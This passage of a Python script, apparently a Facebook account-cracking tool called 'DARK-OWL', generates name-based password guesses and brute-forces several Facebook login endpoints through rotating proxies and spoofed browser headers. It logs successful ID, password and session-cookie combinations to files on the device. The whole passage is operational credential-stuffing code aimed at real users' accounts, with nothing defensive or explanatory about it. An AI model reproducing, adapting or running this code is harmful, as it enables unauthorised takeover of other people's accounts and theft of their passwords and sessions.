	print('\033[1;32m[01] PASSWORD-1 600KB per [💉]')
	print ('\033[1;32m[02] PASSWORD-2 50KB per [💉]')
	print('\033[1;32m[03] PASSWORD-3 1000KB per [💉]')
	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	ch = input('CHOOSE  : \033[1;95m')
	if ch in ['1','01']:
		passwrd()

	if ch in ['2','02']:
		passwrd2()

	if ch in ['3','03']:
		passwrd3()
	else:
		passwrd2()
	

def passwrd2():
	os.system('clear')
	print("""\n
         \033[1;32m  ######   ######  ##    ##\033[1;32m  
         \033[1;32m ##    ## ##    ## ###   ##\033[1;32m  
         \033[1;97m ##       ##       ####  ## \033[1;97m 
         \033[1;97m  ######   ######  ## ## ##\033[1;97m      
         \033[1;97m       ##       ## ##  ####\033[1;97m 
         \033[1;32m ##    ## ##    ## ##   ###\033[1;32m          
         \033[1;32m  ######   ######  ##    ## \x1b[1;91m      PRO
\33[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;92m""")
	print(f'\x1b[1;32m[+] OWNER : MICHAEL COVENANT')
	print(f'\x1b[1;32m[+] VERSION : 1.0')
	print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print(f'\x1b[1;32m[+] TOTAL IDS SAVED IN DARK-OWL-OK.txt')
	print(f'\x1b[1;32m[+] TOTAL IDS SAVED IN DARK-OWL-CP.txt')
	print(f'\x1b[1;32m[+] TOTAL ID :\x1b[1;35m {h}{x}'+str(len(id)))
	print(f'\x1b[1;32m[+] PASSWORD :  2 ')
	print(f'\x1b[1;32m[+] TOTAL USERAGENT 2218 / \x1b[1;91mPROXY 971')
	print(f'\x1b[1;32m[+] BRUTEFORCE HAS STARTED USE FLIGHT MODE IF SLOW')
	print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12345')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'crack' in method:
				pool.submit(crack,idf,pwv)
			elif 'beta' in method:
				pool.submit(beta,idf,pwv)
			elif 'mobile' in method:
				pool.submit(mobile,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(mbasic,idf,pwv)
			elif 'asy' in method:
				pool.submit(asy,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
		exit()



#-------------------[ PASSWORD-WORDLIST ]------------#
def passwrd():
	os.system('clear')
	print("""\n
         \033[1;32m  ######   ######  ##    ##\033[1;32m  
         \033[1;32m ##    ## ##    ## ###   ##\033[1;32m  
         \033[1;97m ##       ##       ####  ## \033[1;97m 
         \033[1;97m  ######   ######  ## ## ##\033[1;97m      
         \033[1;97m       ##       ## ##  ####\033[1;97m 
         \033[1;32m ##    ## ##    ## ##   ###\033[1;32m          
         \033[1;32m  ######   ######  ##    ## \x1b[1;91m      PRO
\33[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;92m""")
	print(f'\x1b[1;32m[+] OWNER : MICHAEL COVENANT')
	print(f'\x1b[1;32m[+] VERSION : 1.0')
	print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print(f'\x1b[1;32m[+] TOTAL IDS SAVED IN DARK-OWL-OK.txt')
	print(f'\x1b[1;32m[+] TOTAL IDS SAVED IN DARK-OWL-CP.txt')
	print(f'\x1b[1;32m[+] TOTAL ID :\x1b[1;35m {h}{x}'+str(len(id)))
	print(f'\x1b[1;32m[+] TOTAL USERAGENT 2218 / \x1b[1;91mPROXY 971')
	print(f'\x1b[1;32m[+] PASSWORD :  1 ')
	print(f'\x1b[1;32m[+] BRUTEFORCE HAS STARTED USE FLIGHT MODE IF SLOW')
	print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					
					pwv.append(frs+'1')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					
					pwv.append(frs+'1')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'crack' in method:
				pool.submit(crack,idf,pwv)
			elif 'beta' in method:
				pool.submit(beta,idf,pwv)
			elif 'mobile' in method:
				pool.submit(mobile,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(mbasic,idf,pwv)
			elif 'asy' in method:
				pool.submit(asy,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
		exit()

		
def passwrd3():
	os.system('clear')
	print("""\n
         \033[1;32m  ######   ######  ##    ##\033[1;32m  
         \033[1;32m ##    ## ##    ## ###   ##\033[1;32m  
         \033[1;97m ##       ##       ####  ## \033[1;97m 
         \033[1;97m  ######   ######  ## ## ##\033[1;97m      
         \033[1;97m       ##       ## ##  ####\033[1;97m 
         \033[1;32m ##    ## ##    ## ##   ###\033[1;32m          
         \033[1;32m  ######   ######  ##    ## \x1b[1;91m      PRO
\33[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;92m""")
	print(f'\x1b[1;32m[+] OWNER : MICHAEL COVENANT')
	print(f'\x1b[1;32m[+] VERSION : 1.0')
	print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print(f'\x1b[1;32m[+] TOTAL IDS SAVED IN DARK-OWL-OK.txt')
	print(f'\x1b[1;32m[+] TOTAL IDS SAVED IN DARK-OWL-CP.txt')
	print(f'\x1b[1;32m[+] TOTAL ID :\x1b[1;35m {h}{x}'+str(len(id)))
	print(f'\x1b[1;32m[+] TOTAL USERAGENT 2218 / \x1b[1;91mPROXY 971')
	print(f'\x1b[1;32m[+] PASSWORD :  1 ')
	print(f'\x1b[1;32m[+] BRUTEFORCE HAS STARTED USE FLIGHT MODE IF SLOW')
	print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					
					pwv.append(frs+'1')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@123')
					pwv.append(frs+'@12345')
					pwv.append(frs+'2020')
					pwv.append(frs+'2019')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'1')
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@123')
					pwv.append(frs+'@12345')
					pwv.append(frs+'2020')
					pwv.append(frs+'2019')
					
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'crack' in method:
				pool.submit(crack,idf,pwv)
			elif 'beta' in method:
				pool.submit(beta,idf,pwv)
			elif 'mobile' in method:
				pool.submit(mobile,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(mbasic,idf,pwv)
			elif 'asy' in method:
				pool.submit(asy,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
		exit()



#________[headers]_________#
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [DARK-OWL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)                        
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [DARK-OWL-OK] %s | %s'%(ids,pas))
                                #cek_apk(session,coki)
                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[1;91m [DARK-OWL-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SPY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1

#--------------------[ METODE-B-API ]-----------------#


#----------------------[ METODE ALPHA ]--------------------#
def beta(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ses = requests.Session()
	sys.stdout.write(f"\r{bo} [DARK-OWL] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.studout.flush()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.alpha.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.alpha.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[DARK-CP] {idf} | {pw}')
				open(f'/sdcard/dark-CP.txt', 'a').write(idf+'|'+pw+'\n')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\r\x1b[38;5;46m[DARK-OWL-OK💉] '+idf+ ' | '+pw+'|'+kuki+'\n')
				open(f'/sdcard/dark-OK.txt', 'a').write(idf+'|'+pw+'\n')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1


######______########
	
	
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} [DARK-OWL] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2076461462396807&kid_directed_site=0&app_id=2076461462396807&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D2076461462396807%26redirect_uri%3Dhttps%253A%252F%252Fduniagames.co.id%252Fnew-callback%26scope%3Dpublic_profile%252Cemail%26code_challenge%3DYqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo%26code_challenge_method%3DS256%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd614149f-136e-431f-babf-db7f365bce91%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fduniagames.co.id%2Fnew-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[DARK-CP] {idf} | {pw}')
				open(f'/sdcard/dark-CP.txt', 'a').write(idf+'|'+pw+'\n')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\r\x1b[38;5;46m[DARK-OWL-OK💉] '+idf+ ' | '+pw+'|'+kuki+'\n')
				open(f'/sdcard/dark-OK.txt', 'a').write(idf+'|'+pw+'\n')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1


def mobile(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ses = requests.Session()
	sys.stdout.write(f"\r{bo} [DARK-OWL] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.studout.flush()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'mbasic.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://mbasic.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://mbasic.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated h2',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[DARK-CP] {idf} | {pw}')
				open(f'/sdcard/dark-CP.txt', 'a').write(idf+'|'+pw+'\n')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\r\x1b[38;5;46m[DARK-OWL-OK💉] '+idf+ ' | '+pw+'|'+kuki+'\n')
				open(f'/sdcard/dark-OK.txt', 'a').write(idf+'|'+pw+'\n')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
	
def asy(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ses = requests.Session()
	sys.stdout.write(f"\r{bo} [DARK-OWL] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.studout.flush()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
